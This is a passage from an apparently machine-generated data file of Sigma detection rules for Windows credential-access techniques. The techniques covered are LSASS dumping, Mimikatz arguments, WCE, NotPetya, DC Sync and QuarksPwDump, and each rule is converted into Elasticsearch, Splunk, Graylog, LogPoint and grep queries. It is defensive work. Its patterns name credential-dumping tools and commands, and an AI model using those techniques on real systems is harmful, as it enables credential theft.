'^(?:.*(?=.*(?:.*(?=.*(?:.*4663|.*4656))(?=.*Process)(?=.*.*\\\\lsass\\\\.exe)))(?=.*(?!.*(?:.*(?=.*.*\\\\$)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: LSASS Memory Dumping\nid: ffa6861c-4461-4f59-8a41-578c39f3f23e\ndescription: Detect creation of dump files containing the memory space of lsass.exe, which contains sensitive credentials. Identifies usage of Sysinternals procdump.exe\n    to export the memory space of lsass.exe which contains sensitive credentials.\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Tony Lambert), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/1e1ef6be-12fc-11e9-8d76-4d6bb837cda4.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/210b4ea4-12fc-11e9-8d76-4d6bb837cda4.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.yaml\ntags:\n    - attack.credential_access\n    - attack.t1003\ndetection:\n    selection1:\n        CommandLine|contains|all:\n            - 'lsass'\n            - '.dmp'\n    selection2:\n        Image|endswith: '\\werfault.exe'\n    selection3:\n        Image|contains: '\\procdump'\n        Image|endswith: '.exe'\n        CommandLine|contains: 'lsass'\n    condition: selection1 and not selection2 or selection3\nfalsepositives:\n    - Unlikely\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: LSASS Memory Dumping\nid: ffa6861c-4461-4f59-8a41-578c39f3f23e\ndescription: Detect creation of dump files containing the memory space of lsass.exe, which contains sensitive credentials. Identifies usage of Sysinternals procdump.exe\n    to export the memory space of lsass.exe which contains sensitive credentials.\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Tony Lambert), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/1e1ef6be-12fc-11e9-8d76-4d6bb837cda4.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/210b4ea4-12fc-11e9-8d76-4d6bb837cda4.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.yaml\ntags:\n    - attack.credential_access\n    - attack.t1003\ndetection:\n    selection1:\n        CommandLine|contains|all:\n            - 'lsass'\n            - '.dmp'\n    selection2:\n        Image|endswith: '\\werfault.exe'\n    selection3:\n        Image|contains: '\\procdump'\n        Image|endswith: '.exe'\n        CommandLine|contains: 'lsass'\n    condition: selection1 and not selection2 or selection3\nfalsepositives:\n    - Unlikely\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(((CommandLine.keyword:*lsass* AND CommandLine.keyword:*.dmp*) AND (NOT (Image.keyword:*\\\\\\\\werfault.exe))) OR (Image.keyword:*\\\\\\\\procdump* AND Image.keyword:*.exe AND CommandLine.keyword:*lsass*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/LSASS-Memory-Dumping <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"LSASS Memory Dumping\",\\n    \"description\": \"Detect creation of dump files containing the memory space of lsass.exe, which contains sensitive credentials. Identifies usage of Sysinternals procdump.exe to export the memory space of lsass.exe which contains sensitive credentials.\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(((CommandLine.keyword:*lsass* AND CommandLine.keyword:*.dmp*) AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\werfault.exe))) OR (Image.keyword:*\\\\\\\\\\\\\\\\procdump* AND Image.keyword:*.exe AND CommandLine.keyword:*lsass*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(((CommandLine.keyword:*lsass* AND CommandLine.keyword:*.dmp*) AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\werfault.exe))) OR (Image.keyword:*\\\\\\\\\\\\\\\\procdump* AND Image.keyword:*.exe AND CommandLine.keyword:*lsass*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'LSASS Memory Dumping\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(((CommandLine.keyword:*lsass* AND CommandLine.keyword:*.dmp*) AND (NOT (Image.keyword:*\\\\\\\\werfault.exe))) OR (Image.keyword:*\\\\\\\\procdump* AND Image.keyword:*.exe AND CommandLine.keyword:*lsass*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((CommandLine=\"*lsass*\" CommandLine=\"*.dmp*\") NOT (Image=\"*\\\\\\\\werfault.exe\")) OR (Image=\"*\\\\\\\\procdump*\" Image=\"*.exe\" CommandLine=\"*lsass*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (((CommandLine=\"*lsass*\" CommandLine=\"*.dmp*\")  -(Image=\"*\\\\\\\\werfault.exe\")) OR (Image=\"*\\\\\\\\procdump*\" Image=\"*.exe\" CommandLine=\"*lsass*\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*(?:.*(?=.*.*lsass.*)(?=.*.*\\\\.dmp.*)))(?=.*(?!.*(?:.*(?=.*.*\\\\werfault\\\\.exe)))))|.*(?:.*(?=.*.*\\\\procdump.*)(?=.*.*\\\\.exe)(?=.*.*lsass.*))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: WCE wceaux.dll Access\nid: 1de68c67-af5c-4097-9c85-fe5578e09e67\nstatus: experimental\ndescription: Detects wceaux.dll access while WCE pass-the-hash remote command execution on source host\nauthor: Thomas Patzke\nreferences:\n    - https://www.jpcert.or.jp/english/pub/sr/ir_research.html\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet\ntags:\n    - attack.credential_access\n    - attack.t1003\n    - attack.s0005\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 4656\n            - 4658\n            - 4660\n            - 4663\n        ObjectName: '*\\wceaux.dll'\n    condition: selection\nfalsepositives: \n    - Penetration testing\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: WCE wceaux.dll Access\nid: 1de68c67-af5c-4097-9c85-fe5578e09e67\nstatus: experimental\ndescription: Detects wceaux.dll access while WCE pass-the-hash remote command execution on source host\nauthor: Thomas Patzke\nreferences:\n    - https://www.jpcert.or.jp/english/pub/sr/ir_research.html\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet\ntags:\n    - attack.credential_access\n    - attack.t1003\n    - attack.s0005\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 4656\n            - 4658\n            - 4660\n            - 4663\n        ObjectName: '*\\wceaux.dll'\n    condition: selection\nfalsepositives: \n    - Penetration testing\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:(\"4656\" OR \"4658\" OR \"4660\" OR \"4663\") AND ObjectName.keyword:*\\\\\\\\wceaux.dll)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/WCE-wceaux.dll-Access <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"WCE wceaux.dll Access\",\\n    \"description\": \"Detects wceaux.dll access while WCE pass-the-hash remote command execution on source host\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\",\\n      \"attack.s0005\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"4656\\\\\" OR \\\\\"4658\\\\\" OR \\\\\"4660\\\\\" OR \\\\\"4663\\\\\") AND ObjectName.keyword:*\\\\\\\\\\\\\\\\wceaux.dll)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"4656\\\\\" OR \\\\\"4658\\\\\" OR \\\\\"4660\\\\\" OR \\\\\"4663\\\\\") AND ObjectName.keyword:*\\\\\\\\\\\\\\\\wceaux.dll)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'WCE wceaux.dll Access\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"4656\" \"4658\" \"4660\" \"4663\") AND ObjectName.keyword:*\\\\\\\\wceaux.dll)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"4656\" OR EventID=\"4658\" OR EventID=\"4660\" OR EventID=\"4663\") ObjectName=\"*\\\\\\\\wceaux.dll\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id IN [\"4656\", \"4658\", \"4660\", \"4663\"] ObjectName=\"*\\\\\\\\wceaux.dll\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*4656|.*4658|.*4660|.*4663))(?=.*.*\\\\wceaux\\\\.dll))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: NotPetya Ransomware Activity\nid: 79aeeb41-8156-4fac-a0cd-076495ab82a1\nstatus: experimental\ndescription: Detects NotPetya ransomware activity in which the extracted passwords are passed back to the main module via named pipe, the file system journal of drive\n    C is deleted and windows eventlogs are cleared using wevtutil\nauthor: Florian Roth, Tom Ueltschi\nreferences:\n    - https://securelist.com/schroedingers-petya/78870/\n    - https://www.hybrid-analysis.com/sample/64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1?environmentId=100\ntags:\n    - attack.execution\n    - attack.credential_access\n    - attack.defense_evasion\n    - attack.t1085\n    - attack.t1070\n    - attack.t1003\n    - car.2016-04-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    pipe_com:\n        CommandLine: '*\\AppData\\Local\\Temp\\\\* \\\\.\\pipe\\\\*'\n    rundll32_dash1:\n        Image: '*\\rundll32.exe'\n        CommandLine: '*.dat,#1'\n    perfc_keyword:\n        - '*\\perfc.dat*'\n    condition: 1 of them\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Admin activity\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: NotPetya Ransomware Activity\nid: 79aeeb41-8156-4fac-a0cd-076495ab82a1\nstatus: experimental\ndescription: Detects NotPetya ransomware activity in which the extracted passwords are passed back to the main module via named pipe, the file system journal of drive\n    C is deleted and windows eventlogs are cleared using wevtutil\nauthor: Florian Roth, Tom Ueltschi\nreferences:\n    - https://securelist.com/schroedingers-petya/78870/\n    - https://www.hybrid-analysis.com/sample/64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1?environmentId=100\ntags:\n    - attack.execution\n    - attack.credential_access\n    - attack.defense_evasion\n    - attack.t1085\n    - attack.t1070\n    - attack.t1003\n    - car.2016-04-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    pipe_com:\n        CommandLine: '*\\AppData\\Local\\Temp\\\\* \\\\.\\pipe\\\\*'\n    rundll32_dash1:\n        Image: '*\\rundll32.exe'\n        CommandLine: '*.dat,#1'\n    perfc_keyword:\n        - '*\\perfc.dat*'\n    condition: 1 of them\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Admin activity\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\*\\\\ \\\\\\\\.\\\\\\\\pipe\\\\\\\\* OR (Image.keyword:*\\\\\\\\rundll32.exe AND CommandLine.keyword:*.dat,#1) OR *\\\\\\\\perfc.dat*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/NotPetya-Ransomware-Activity <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"NotPetya Ransomware Activity\",\\n    \"description\": \"Detects NotPetya ransomware activity in which the extracted passwords are passed back to the main module via named pipe, the file system journal of drive C is deleted and windows eventlogs are cleared using wevtutil\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.credential_access\",\\n      \"attack.defense_evasion\",\\n      \"attack.t1085\",\\n      \"attack.t1070\",\\n      \"attack.t1003\",\\n      \"car.2016-04-002\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\*\\\\\\\\ \\\\\\\\\\\\\\\\.\\\\\\\\\\\\\\\\pipe\\\\\\\\\\\\\\\\* OR (Image.keyword:*\\\\\\\\\\\\\\\\rundll32.exe AND CommandLine.keyword:*.dat,#1) OR *\\\\\\\\\\\\\\\\perfc.dat*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\*\\\\\\\\ \\\\\\\\\\\\\\\\.\\\\\\\\\\\\\\\\pipe\\\\\\\\\\\\\\\\* OR (Image.keyword:*\\\\\\\\\\\\\\\\rundll32.exe AND CommandLine.keyword:*.dat,#1) OR *\\\\\\\\\\\\\\\\perfc.dat*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'NotPetya Ransomware Activity\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\* \\\\\\\\.\\\\\\\\pipe\\\\\\\\* OR (Image.keyword:*\\\\\\\\rundll32.exe AND CommandLine.keyword:*.dat,#1) OR *\\\\\\\\perfc.dat*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\* \\\\\\\\.\\\\\\\\pipe\\\\\\\\*\" OR (Image=\"*\\\\\\\\rundll32.exe\" CommandLine=\"*.dat,#1\") OR \"*\\\\\\\\perfc.dat*\") | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (CommandLine=\"*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\* \\\\\\\\.\\\\\\\\pipe\\\\\\\\*\" OR (Image=\"*\\\\\\\\rundll32.exe\" CommandLine=\"*.dat,#1\") OR \"*\\\\\\\\perfc.dat*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*.*\\\\AppData\\\\Local\\\\Temp\\\\\\\\.* \\\\\\\\\\\\.\\\\pipe\\\\\\\\.*|.*(?:.*(?=.*.*\\\\rundll32\\\\.exe)(?=.*.*\\\\.dat,#1))|.*.*\\\\perfc\\\\.dat.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Mimikatz command line\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\ndescription: Detection well-known mimikatz command line arguments\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - DumpCreds\n            - invoke-mimikatz\n    selection_2:\n        CommandLine|contains:\n            - rpc\n            - token\n            - crypto\n            - dpapi\n            - sekurlsa\n            - kerberos\n            - lsadump\n            - privilege\n            - process\n    selection_3:\n        CommandLine|contains:\n            - '::'\n    condition: selection_1 or \n               selection_2 and selection_3\nfalsepositives:\n    - Legitimate Administrator using tool for password recovery\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Mimikatz command line\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\ndescription: Detection well-known mimikatz command line arguments\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - DumpCreds\n            - invoke-mimikatz\n    selection_2:\n        CommandLine|contains:\n            - rpc\n            - token\n            - crypto\n            - dpapi\n            - sekurlsa\n            - kerberos\n            - lsadump\n            - privilege\n            - process\n    selection_3:\n        CommandLine|contains:\n            - '::'\n    condition: selection_1 or \n               selection_2 and selection_3\nfalsepositives:\n    - Legitimate Administrator using tool for password recovery\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:(*DumpCreds* OR *invoke\\\\-mimikatz*) OR (CommandLine.keyword:(*rpc* OR *token* OR *crypto* OR *dpapi* OR *sekurlsa* OR *kerberos* OR *lsadump* OR *privilege* OR *process*) AND CommandLine.keyword:(*\\\\:\\\\:*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Mimikatz-command-line <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Mimikatz command line\",\\n    \"description\": \"Detection well-known mimikatz command line arguments\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:(*DumpCreds* OR *invoke\\\\\\\\-mimikatz*) OR (CommandLine.keyword:(*rpc* OR *token* OR *crypto* OR *dpapi* OR *sekurlsa* OR *kerberos* OR *lsadump* OR *privilege* OR *process*) AND CommandLine.keyword:(*\\\\\\\\:\\\\\\\\:*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:(*DumpCreds* OR *invoke\\\\\\\\-mimikatz*) OR (CommandLine.keyword:(*rpc* OR *token* OR *crypto* OR *dpapi* OR *sekurlsa* OR *kerberos* OR *lsadump* OR *privilege* OR *process*) AND CommandLine.keyword:(*\\\\\\\\:\\\\\\\\:*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Mimikatz command line\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:(*DumpCreds* *invoke\\\\-mimikatz*) OR (CommandLine.keyword:(*rpc* *token* *crypto* *dpapi* *sekurlsa* *kerberos* *lsadump* *privilege* *process*) AND CommandLine.keyword:(*\\\\:\\\\:*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((CommandLine=\"*DumpCreds*\" OR CommandLine=\"*invoke-mimikatz*\") OR ((CommandLine=\"*rpc*\" OR CommandLine=\"*token*\" OR CommandLine=\"*crypto*\" OR CommandLine=\"*dpapi*\" OR CommandLine=\"*sekurlsa*\" OR CommandLine=\"*kerberos*\" OR CommandLine=\"*lsadump*\" OR CommandLine=\"*privilege*\" OR CommandLine=\"*process*\") (CommandLine=\"*::*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (CommandLine IN [\"*DumpCreds*\", \"*invoke-mimikatz*\"] OR (CommandLine IN [\"*rpc*\", \"*token*\", \"*crypto*\", \"*dpapi*\", \"*sekurlsa*\", \"*kerberos*\", \"*lsadump*\", \"*privilege*\", \"*process*\"] CommandLine IN [\"*::*\"])))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*.*DumpCreds.*|.*.*invoke-mimikatz.*)|.*(?:.*(?=.*(?:.*.*rpc.*|.*.*token.*|.*.*crypto.*|.*.*dpapi.*|.*.*sekurlsa.*|.*.*kerberos.*|.*.*lsadump.*|.*.*privilege.*|.*.*process.*))(?=.*(?:.*.*::.*)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Possible DC Sync\nid: 32e19d25-4aed-4860-a55a-be99cb0bf7ed\ndescription: Detects DC sync via create new SPN\nstatus: experimental\nauthor: Ilyas Ochkov, oscd.community\ndate: 2019/10/25\nreferences:\n    - https://github.com/Neo23x0/sigma/blob/ec5bb710499caae6667c7f7311ca9e92c03b9039/rules/windows/builtin/win_dcsync.yml\n    - https://twitter.com/gentilkiwi/status/1003236624925413376\n    - https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2\n    - https://jsecurity101.com/2019/Syncing-into-the-Shadows/\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4742\n        ServicePrincipalNames: '*GC/*'\n    condition: selection\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Possible DC Sync\nid: 32e19d25-4aed-4860-a55a-be99cb0bf7ed\ndescription: Detects DC sync via create new SPN\nstatus: experimental\nauthor: Ilyas Ochkov, oscd.community\ndate: 2019/10/25\nreferences:\n    - https://github.com/Neo23x0/sigma/blob/ec5bb710499caae6667c7f7311ca9e92c03b9039/rules/windows/builtin/win_dcsync.yml\n    - https://twitter.com/gentilkiwi/status/1003236624925413376\n    - https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2\n    - https://jsecurity101.com/2019/Syncing-into-the-Shadows/\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4742\n        ServicePrincipalNames: '*GC/*'\n    condition: selection\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4742\" AND ServicePrincipalNames.keyword:*GC\\\\/*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Possible-DC-Sync <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Possible DC Sync\",\\n    \"description\": \"Detects DC sync via create new SPN\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4742\\\\\" AND ServicePrincipalNames.keyword:*GC\\\\\\\\/*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4742\\\\\" AND ServicePrincipalNames.keyword:*GC\\\\\\\\/*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Possible DC Sync\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4742\" AND ServicePrincipalNames.keyword:*GC\\\\/*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4742\" ServicePrincipalNames=\"*GC/*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4742\" ServicePrincipalNames=\"*GC/*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4742)(?=.*.*GC/.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: QuarksPwDump clearing access history\nid: 39f919f3-980b-4e6f-a975-8af7e507ef2b\nstatus: experimental\ndescription: Detects QuarksPwDump clearing access history in hive\nauthor: Florian Roth\ndate: 2017/05/15\nmodified: 2019/11/13\ntags:\n    - attack.credential_access\n    - attack.t1003\nlevel: critical\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: 16\n        HiveName|contains: '\\AppData\\Local\\Temp\\SAM'\n        HiveName|endswith: '.dmp'\n    condition: selection\nfalsepositives:\n    - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: QuarksPwDump clearing access history\nid: 